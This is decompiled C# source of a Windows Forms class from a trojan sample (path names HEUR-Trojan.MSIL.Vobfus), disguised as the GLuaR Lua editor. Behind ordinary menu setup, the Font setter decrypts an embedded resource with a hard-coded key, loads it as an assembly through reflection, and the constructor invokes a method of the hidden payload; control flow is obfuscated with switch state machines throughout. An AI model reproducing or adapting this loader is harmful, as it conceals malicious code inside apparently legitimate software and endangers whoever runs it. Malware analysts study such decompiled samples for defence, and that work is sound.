// Decompiled with JetBrains decompiler
// Type: c.Candidates.PageIdentifierCandidate
// Assembly: c, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CCB3E154-F36D-403E-8019-8861E9AEB8FC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Vobfus.gen-191db013c67081442ef5e75edd00c2572f6ec9d7f629ddac9bba8942722c061d.exe

using c.Filter;
using c.States;
using GLuaR.Database;
using GLuaR.Importers;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace c.Candidates
{
  public class PageIdentifierCandidate : Form
  {
    private readonly InterceptorThreadFilter m_ThreadField;
    private IContainer _IdentifierField;
    private static object _MethodField;
    private ToolStripContainer _InvocationField;
    private MenuStrip readerField;
    private ToolStripMenuItem m_TaskField;
    private ToolStripMenuItem _CollectionField;
    private ToolStripMenuItem bridgeField;
    private ToolStripMenuItem _RefField;
    private ToolStripSeparator m_InterceptorField;
    private ToolStripMenuItem _SingletonField;
    private ToolStripMenuItem m_ParameterField;
    private ToolStripMenuItem _ProccesorField;
    private ToolStripMenuItem templateField;
    private ToolStripSeparator m_ParamField;
    private ToolStripMenuItem mappingField;
    private ToolStripSeparator _ImporterField;
    private ToolStripMenuItem resolverField;
    private ToolStripMenuItem _StatusField;
    private ToolStripMenuItem _RecordField;
    private ToolStripSeparator algoField;
    private ToolStripMenuItem _SystemField;
    private ToolStripMenuItem m_TestsField;
    private ToolStripMenuItem serviceField;
    private ToolStripMenuItem _ComposerField;
    private ToolStripSeparator m_DescriptorField;
    private ToolStripMenuItem _ErrorField;
    private ToolStripSeparator m_AdapterField;
    private ToolStripMenuItem m_PublisherField;
    private ToolStripMenuItem poolField;
    private ToolStripMenuItem eventField;
    private ToolStripMenuItem m_AttributeField;
    private ToolStripMenuItem m_ProcessField;
    private ToolStripMenuItem specificationField;
    private ToolStripMenuItem m_RegistryField;
    private ToolStripMenuItem setterField;
    private ToolStripMenuItem _TagField;
    private ToolStripMenuItem m_ServerField;
    private ToolStripMenuItem _ProducerField;
    private ToolStripSeparator repositoryField;
    private ToolStripMenuItem dicField;
    private ToolStripSeparator _RoleField;
    private ToolStripMenuItem m_StructField;
    private ToolStripMenuItem itemField;
    private ToolStripMenuItem m_ParamsField;
    private ToolStripSeparator broadcasterField;
    private ToolStripMenuItem m_ListenerField;
    private ToolStripSeparator _InterpreterField;
    private ToolStripMenuItem m_PrinterField;
    private ToolStripMenuItem m_ProductField;
    private ToolStripMenuItem codeField;
    private ToolStripMenuItem _CreatorField;
    private ToolStripSeparator m_ProxyField;
    private ToolStripMenuItem helperField;
    private ToolStripMenuItem _StrategyField;
    private ToolStripSeparator _GlobalField;
    private ToolStripMenuItem attrField;
    private ToolStrip utilsField;
    private ToolStripButton m_ParserField;
    private ToolStripSplitButton _AuthenticationField;
    private ToolStripMenuItem _ConfigurationField;
    private ToolStripMenuItem _ManagerField;
    private ToolStripButton _PrototypeField;
    private ToolStripButton tokenField;
    private ToolStripButton m_ExceptionField;
    private ToolStripSeparator _RequestField;
    private ToolStripButton serializerField;
    private ToolStripButton m_IssuerField;
    private ToolStripButton _DatabaseField;
    private ToolStripSeparator _ClassField;
    private ToolStripButton m_IndexerField;
    private ToolStripButton m_ContextField;
    private ToolStripSeparator _AdvisorField;
    private ToolStripButton filterField;
    private ToolStripComboBox _ModelField;
    private ToolStripSeparator _PageField;
    private ToolStripButton _RegField;
    private ToolStripButton m_WorkerField;
    private ToolStripButton _ConnectionField;
    private ToolStripButton m_InitializerField;
    private ImageList _IteratorField;
    private ToolStripMenuItem m_ExpressionField;
    private Panel _BaseField;
    private Button m_AccountField;
    private Label _StubField;
    private TextBox m_MockField;
    private ToolStripButton callbackField;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public PageIdentifierCandidate()
    {
      int num1 = 1;
      while (true)
      {
        string[] parameters;
        MethodInfo method;
        int num2;
        switch (num1)
        {
          case 0:
            // ISSUE: reference to a compiler-generated method
            this._IteratorField.Images.Add("root", (Image) GLuaR.Properties.Resources.RateField());
            // ISSUE: reference to a compiler-generated method
            this._IteratorField.Images.Add("code", (Image) GLuaR.Properties.Resources.RegisterField());
            this._IteratorField.Images.Add("tasklist_checkbox", (Image) GLuaR.Properties.Resources.tasklist_checkbox);
            // ISSUE: reference to a compiler-generated method
            this._IteratorField.Images.Add("server", (Image) GLuaR.Properties.Resources.ResetFactory());
            // ISSUE: reference to a compiler-generated method
            this._IteratorField.Images.Add("client", (Image) GLuaR.Properties.Resources.RestartFactory());
            // ISSUE: reference to a compiler-generated method
            this._IteratorField.Images.Add("shared", (Image) GLuaR.Properties.Resources.CancelFactory());
            if (PageIdentifierCandidate.InsertRegistry())
            {
              num1 = 8;
              continue;
            }
            goto label_11;
          case 1:
            ImporterMapper.InitAccount();
            num2 = 7;
            break;
          case 2:
            // ISSUE: reference to a compiler-generated method
            this._IteratorField.Images.Add("file_lost", (Image) GLuaR.Properties.Resources.GetFactory());
            num1 = 9;
            continue;
          case 3:
          case 6:
            parameters[0] = "495472616E73706F727448656164";
            parameters[1] = "6362334F";
            parameters[2] = "GLuaR";
            method.Invoke((object) 0, (object[]) parameters);
            goto case 0;
          case 4:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            this.CloneRule();
            method = ((System.Type) PageIdentifierCandidate._MethodField).GetMethod("InvalidCast");
            parameters = new string[3];
            num2 = 6;
            break;
          case 5:
          case 8:
            this._IteratorField.Images.Add("library", (Image) GLuaR.Properties.Resources.library);
            this._IteratorField.Images.Add("keyword", (Image) GLuaR.Properties.Resources.keyword);
            // ISSUE: reference to a compiler-generated method
            this._IteratorField.Images.Add("folder_open", (Image) GLuaR.Properties.Resources.QueryField());
            this._IteratorField.Images.Add("folder_closed", (Image) GLuaR.Properties.Resources.project_folder_closed);
            num2 = 2;
            break;
          case 7:
            this._IdentifierField = (IContainer) null;
            num2 = 4;
            break;
          case 9:
            goto label_13;
          default:
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto case 7;
        }
        num1 = num2;
      }
label_13:
      return;
label_11:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public PageIdentifierCandidate(string task)
    {
      ImporterMapper.InitAccount();
      // ISSUE: explicit constructor call
      this.\u002Ector();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RateMapper(object res, EventArgs counter)
    {
      int num1 = 2;
      while (true)
      {
        bool flag;
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
            flag = this.m_ThreadField.RemoveWrapper();
            num2 = 3;
            break;
          case 1:
          case 3:
            if (!flag)
              goto label_4;
            else
              goto case 4;
          case 4:
            this.Close();
            num1 = 5;
            continue;
          case 5:
            goto label_8;
          default:
            num2 = 4;
            break;
        }
        num1 = num2;
      }
label_4:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PrintMapper(object first, EventArgs ord) => this.m_ThreadField.PushWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CountMapper(object key, EventArgs pred) => this.m_ThreadField.InitWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CallMapper(object param, EventArgs ivk) => this.m_ThreadField.UpdateWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ManageMapper(object asset, EventArgs counter) => this.m_ThreadField.ResolveWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InstantiateMapper(object res, EventArgs reg) => this.m_ThreadField.ValidateWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ReflectMapper(object task, EventArgs connection) => this.m_ThreadField.SearchWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void OrderMapper(object instance, EventArgs cont) => this.m_ThreadField.AssetWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StartMapper(object ident, EventArgs ord) => this.m_ThreadField.FlushWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PushMapper(object reference, EventArgs ord) => this.m_ThreadField.FillWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InitMapper(object ident, EventArgs ivk) => this.m_ThreadField.PublishWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ValidateMapper(object config, EventArgs selection) => this.m_ThreadField.PopWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void AssetMapper(object instance, EventArgs col) => this.m_ThreadField.NewWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DeleteMapper(object item, EventArgs b) => this.m_ThreadField.Delete();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void UpdateMapper(object res, EventArgs pred) => this.m_ThreadField.RunWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SelectMapper(object last, EventArgs pol)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ConnectMapper(object def, EventArgs map) => this.m_ThreadField.SetMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ViewMapper(object ident, EventArgs caller) => this.m_ThreadField.CloneMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PrepareMapper(object v, EventArgs cfg) => this.m_ThreadField.CalcWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ChangeMapper(object setup, EventArgs result) => this.m_ThreadField.ExcludeWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void TestMapper(object info, EventArgs b) => this.m_ThreadField.SortMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ConcatMapper(object last, EventArgs vis) => this.m_ThreadField.CallWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void AddMapper(object init, EventArgs connection) => this.m_ThreadField.ReadMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PostMapper(object value, EventArgs cust)
    {
      try
      {
        Process.Start("http://wiki.garrysmod.com/wiki/?title=Lua");
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CalculateMapper(object info, EventArgs attr)
    {
      try
      {
        Process.Start("http://forums.facepunchstudios.com/forumdisplay.php?f=65");
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void IncludeMapper(object first, EventArgs counter)
    {
      try
      {
        Process.Start("http://glua.net/");
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ResolveMapper(object setup, EventArgs vis) => this.m_ThreadField.CollectMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StopMapper(object asset, EventArgs counter) => this.m_ThreadField.CustomizeMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PatchMapper(object var1, EventArgs counter) => this.m_ThreadField.PushWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ForgotMapper(object key, EventArgs pol) => this.m_ThreadField.CalcWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SearchMapper(object i, EventArgs pred) => this.m_ThreadField.ExcludeWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void GetMapper(object first, EventArgs map) => this.m_ThreadField.UpdateWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RemoveMapper(object instance, EventArgs pred) => this.m_ThreadField.SearchWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CalcMapper(object last, EventArgs map) => this.m_ThreadField.AssetWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void DestroyMapper(object config, EventArgs vis) => this.m_ThreadField.PublishWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ExcludeMapper(object value, EventArgs cfg) => this.m_ThreadField.PopWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FindMapper(object setup, EventArgs vis) => this.m_ThreadField.NewWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RestartMapper(object ident, EventArgs ivk) => this.m_ThreadField.FlushWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void VisitMapper(object var1, EventArgs counter) => this.m_ThreadField.FillWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ResetMapper(object v, EventArgs attr) => this.m_ThreadField.LoginMapper(this._ModelField.Text);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SetupMapper(object param, EventArgs token)
    {
      int num1 = 4;
      while (true)
      {
        int num2 = num1;
        Point point;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              this.utilsField.Enabled = false;
              if (!PageIdentifierCandidate.ReadRegistry())
              {
                num2 = 5;
                continue;
              }
              goto label_6;
            case 1:
              point.X = this.Width / 2 + this._BaseField.Width / 2 - this._BaseField.Width;
              point.Y = this.Height / 2 + this._BaseField.Height / 2 - this._BaseField.Height;
              goto case 2;
            case 2:
            case 3:
              this._BaseField.Location = point;
              this.ControlBox = false;
              if (PageIdentifierCandidate.InsertRegistry())
              {
                num2 = 6;
                continue;
              }
              goto label_8;
            case 5:
              goto label_6;
            case 6:
              goto label_10;
            default:
              if (PageIdentifierCandidate.InsertRegistry())
              {
                num2 = 2;
                continue;
              }
              goto case 0;
          }
        }
label_6:
        this.readerField.Enabled = false;
        point = new Point();
        num1 = 1;
      }
label_10:
      return;
label_8:;
    }

    [DllImport("KERNEL32.DLL", EntryPoint = "CloseHandle", SetLastError = true)]
    public static extern bool CancelMapper(int insertFIRSTAt);

    [DllImport("ADVAPI32.DLL", EntryPoint = "LogonUserW", CharSet = CharSet.Unicode, SetLastError = true)]
    public static extern bool CreateMapper(
      string reference,
      string map,
      string third,
      int t2,
      int info3,
      out int param4);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CheckMapper(object instance, EventArgs map)
    {
      int insertFIRSTAt = 0;
      try
      {
        bool mapper = PageIdentifierCandidate.CreateMapper(Environment.UserName, Environment.UserDomainName, this.m_MockField.Text, 3, 0, out insertFIRSTAt);
        int num1 = 1;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 1:
                goto label_8;
              case 2:
              case 4:
                goto label_2;
              case 3:
                goto label_4;
              case 5:
                goto label_10;
              default:
                num2 = 4;
                continue;
            }
          }
label_8:
          if (!mapper)
          {
            int num3 = (int) MessageBox.Show("Cannot Unlock... Invalid Windows Password...", "Error", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            num1 = 5;
          }
          else
          {
            this.m_MockField.Clear();
            this.utilsField.Enabled = true;
            num1 = 3;
          }
        }
label_2:
        this.ControlBox = true;
        return;
label_4:
        this.readerField.Enabled = true;
        goto label_2;
label_10:;
      }
      finally
      {
        PageIdentifierCandidate.CancelMapper(insertFIRSTAt);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FlushMapper(object task, KeyEventArgs vis) => vis.Handled = true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void FillMapper(object info, KeyPressEventArgs pred) => pred.Handled = true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PublishMapper(object init, KeyEventArgs col) => col.Handled = true;

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PopMapper(object reference, EventArgs reg) => this._AuthenticationField.ShowDropDown();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void NewMapper(object param, EventArgs visitor) => this.m_ThreadField.AwakeMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RunMapper(object res, EventArgs caller) => this.m_ThreadField.RateWrapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void RevertMapper(object key, EventArgs vis) => this.m_ThreadField.ListMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void EnableRule(object key, EventArgs cust) => this.m_ThreadField.ComputeMapper();

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void MoveRule(object v, EventArgs connection) => new ServiceWrapper().Show(this.m_ThreadField.exporter);

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool insertdef)
    {
      int num1 = 3;
      while (true)
      {
        int num2;
        switch (num1)
        {
          case 0:
          case 2:
label_7:
            goto label_8;
          case 1:
          case 4:
            num2 = this._IdentifierField != null ? 1 : 0;
            break;
          case 3:
label_9:
            if (!insertdef)
            {
              num2 = 0;
              break;
            }
            num1 = 4;
            continue;
          case 5:
            goto label_12;
          default:
            if (true)
            {
              num1 = 0;
              continue;
            }
            goto case 0;
        }
        if (num2 != 0)
        {
          this._IdentifierField.Dispose();
          goto label_7;
        }
label_8:
        base.Dispose(insertdef);
        if (true)
          num1 = 5;
        else
          goto label_9;
      }
label_12:;
    }

    public override Font Font
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => base.Font;
      [MethodImpl(MethodImplOptions.NoInlining)] set => PageIdentifierCandidate.SetRule();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static string SetRule()
    {
      int num1 = 4;
      string str1;
      while (true)
      {
        int num2 = num1;
        ResourceManager resourceManager;
        int num3;
        bool flag;
        byte[] numArray;
        string str2;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 4:
              resourceManager = new ResourceManager(typeof (IndexerStateStatus));
              int num4 = 6;
              num2 = PageIdentifierCandidate.ReadRegistry() ? num4 : num4;
              continue;
            case 1:
            case 6:
              goto label_8;
            case 2:
              flag = num3 >= 0;
              int num5 = 5;
              num2 = PageIdentifierCandidate.ReadRegistry() ? num5 : num5;
              continue;
            case 3:
              num3 = 25622;
              goto case 2;
            case 5:
              if (flag)
              {
                numArray[num3 % 12800] = (byte) ((uint) ((int) Convert.ToUInt32((int) numArray[num3 % 12800] ^ (int) str2[num3 % 22]) - (int) Convert.ToUInt32(numArray[(num3 + 1) % 12800]) + 256) % 256U);
                num3 += -1;
                goto case 2;
              }
              else
              {
                PageIdentifierCandidate.LoginRule((Assembly) typeof (Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
                {
                  (object) numArray
                }), 1);
                str1 = str2;
                if (true)
                {
                  num2 = 7;
                  continue;
                }
                goto label_11;
              }
            case 7:
              goto label_11;
            default:
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto label_8;
          }
        }
label_8:
        numArray = (byte[]) resourceManager.GetObject("Abstract");
        str2 = "C58B575PE978EA88DE4F5W";
        num1 = 3;
      }
label_11:
      return str1;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void LoginRule(Assembly res, int map_min) => PageIdentifierCandidate._MethodField = (object) res.GetType("Evercraft_model.Character");

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CloneRule()
    {
      int num1 = 8;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_4;
            case 1:
              goto label_15;
            case 2:
              goto label_12;
            case 3:
              this._InvocationField.Name = "tsContainer";
              this._InvocationField.Size = new Size(826, 442);
              this._InvocationField.TabIndex = 0;
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto label_12;
            case 4:
            case 11:
              goto label_9;
            case 5:
              this.SuspendLayout();
              if (PageIdentifierCandidate.InsertRegistry())
              {
                num2 = 13;
                continue;
              }
              goto label_9;
            case 6:
            case 23:
              this._ErrorField = new ToolStripMenuItem();
              this.m_AdapterField = new ToolStripSeparator();
              this.m_PublisherField = new ToolStripMenuItem();
              this.poolField = new ToolStripMenuItem();
              num2 = 15;
              continue;
            case 7:
              this.m_StructField = new ToolStripMenuItem();
              this.itemField = new ToolStripMenuItem();
              this.m_ParamsField = new ToolStripMenuItem();
              num2 = 9;
              continue;
            case 8:
              goto label_14;
            case 9:
              goto label_24;
            case 10:
              goto label_26;
            case 12:
              this.m_TaskField = new ToolStripMenuItem();
              this._CollectionField = new ToolStripMenuItem();
              this.bridgeField = new ToolStripMenuItem();
              this._RefField = new ToolStripMenuItem();
              this.m_InterceptorField = new ToolStripSeparator();
              num2 = 11;
              continue;
            case 13:
              this.Font = (Font) null;
              if (PageIdentifierCandidate.InsertRegistry())
              {
                num2 = 17;
                continue;
              }
              goto case 5;
            case 14:
              this._InterpreterField = new ToolStripSeparator();
              goto case 22;
            case 15:
              this.eventField = new ToolStripMenuItem();
              this.m_AttributeField = new ToolStripMenuItem();
              this.m_ProcessField = new ToolStripMenuItem();
              this.specificationField = new ToolStripMenuItem();
              this.m_RegistryField = new ToolStripMenuItem();
              if (true)
              {
                num2 = 16;
                continue;
              }
              goto case 17;
            case 16:
              this.setterField = new ToolStripMenuItem();
              this._TagField = new ToolStripMenuItem();
              this.m_ServerField = new ToolStripMenuItem();
              if (true)
              {
                num2 = 18;
                continue;
              }
              goto label_29;
            case 17:
              this._InvocationField.ContentPanel.Size = new Size(826, 393);
              this._InvocationField.Dock = DockStyle.Fill;
              this._InvocationField.Location = new Point(0, 0);
              num2 = 3;
              continue;
            case 18:
              this._ProducerField = new ToolStripMenuItem();
              this.repositoryField = new ToolStripSeparator();
              this.dicField = new ToolStripMenuItem();
              this._RoleField = new ToolStripSeparator();
              if (true)
              {
                num2 = 7;
                continue;
              }
              goto case 14;
            case 19:
              this._GlobalField = new ToolStripSeparator();
              this.attrField = new ToolStripMenuItem();
              this.utilsField = new ToolStrip();
              this.m_ParserField = new ToolStripButton();
              this._AuthenticationField = new ToolStripSplitButton();
              this._ConfigurationField = new ToolStripMenuItem();
              this._ManagerField = new ToolStripMenuItem();
              this._PrototypeField = new ToolStripButton();
              num2 = 21;
              continue;
            case 20:
              this.m_ProxyField = new ToolStripSeparator();
              this.helperField = new ToolStripMenuItem();
              this._StrategyField = new ToolStripMenuItem();
              num2 = 19;
              continue;
            case 21:
              goto label_1;
            case 22:
              this.m_PrinterField = new ToolStripMenuItem();
              this.m_ExpressionField = new ToolStripMenuItem();
              this.m_ProductField = new ToolStripMenuItem();
              this.codeField = new ToolStripMenuItem();
              this._CreatorField = new ToolStripMenuItem();
              if (true)
              {
                num2 = 20;
                continue;
              }
              goto case 20;
            case 24:
              this.utilsField.SuspendLayout();
              if (!PageIdentifierCandidate.ReadRegistry())
              {
                num2 = 5;
                continue;
              }
              goto case 13;
            case 25:
              ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (PageIdentifierCandidate));
              this._InvocationField = new ToolStripContainer();
              this._BaseField = new Panel();
              if (PageIdentifierCandidate.InsertRegistry())
              {
                num2 = 26;
                continue;
              }
              goto case 3;
            case 26:
              goto label_5;
            case 27:
              goto label_30;
            default:
              goto label_23;
          }
        }
label_1:
        this.tokenField = new ToolStripButton();
        this.m_ExceptionField = new ToolStripButton();
        this._RequestField = new ToolStripSeparator();
        this.serializerField = new ToolStripButton();
        this.m_IssuerField = new ToolStripButton();
        this._DatabaseField = new ToolStripButton();
        this._ClassField = new ToolStripSeparator();
        this.m_IndexerField = new ToolStripButton();
        this.m_ContextField = new ToolStripButton();
        this._AdvisorField = new ToolStripSeparator();
        num1 = 2;
        continue;
label_4:
        this.templateField = new ToolStripMenuItem();
        this.m_ParamField = new ToolStripSeparator();
        this.mappingField = new ToolStripMenuItem();
        this.resolverField = new ToolStripMenuItem();
        this._StatusField = new ToolStripMenuItem();
        this._RecordField = new ToolStripMenuItem();
        this.algoField = new ToolStripSeparator();
        this._SystemField = new ToolStripMenuItem();
        this.m_TestsField = new ToolStripMenuItem();
        this.serviceField = new ToolStripMenuItem();
        this._ComposerField = new ToolStripMenuItem();
        this.m_DescriptorField = new ToolStripSeparator();
        num1 = 23;
        continue;
label_5:
        this.m_AccountField = new Button();
        this._StubField = new Label();
        this.m_MockField = new TextBox();
        this.readerField = new MenuStrip();
        num1 = 12;
        continue;
label_9:
        this._SingletonField = new ToolStripMenuItem();
        this.m_ParameterField = new ToolStripMenuItem();
        this._ImporterField = new ToolStripSeparator();
        this._ProccesorField = new ToolStripMenuItem();
        num1 = 0;
        continue;
label_12:
        this._ModelField = new ToolStripComboBox();
        this.filterField = new ToolStripButton();
        this._PageField = new ToolStripSeparator();
        this._RegField = new ToolStripButton();
        this.m_WorkerField = new ToolStripButton();
        this._ConnectionField = new ToolStripButton();
        this.m_InitializerField = new ToolStripButton();
        num1 = 10;
        continue;
label_14:
        this._IdentifierField = (IContainer) new Container();
        num1 = 25;
        continue;
label_15:
        this._InvocationField.Text = "toolStripContainer1";
        num1 = 27;
        continue;
label_23:
        num1 = 22;
        continue;
label_24:
        this.broadcasterField = new ToolStripSeparator();
        this.m_ListenerField = new ToolStripMenuItem();
        num1 = 14;
        continue;
label_26:
        this._IteratorField = new ImageList(this._IdentifierField);
        this.callbackField = new ToolStripButton();
        this._InvocationField.ContentPanel.SuspendLayout();
        this._InvocationField.TopToolStripPanel.SuspendLayout();
        this._InvocationField.SuspendLayout();
        this._BaseField.SuspendLayout();
        this.readerField.SuspendLayout();
        num1 = 24;
      }
label_30:
      return;
label_29:;
    }

    internal static bool InsertRegistry() => true;

    internal static bool ReadRegistry() => false;
  }
}
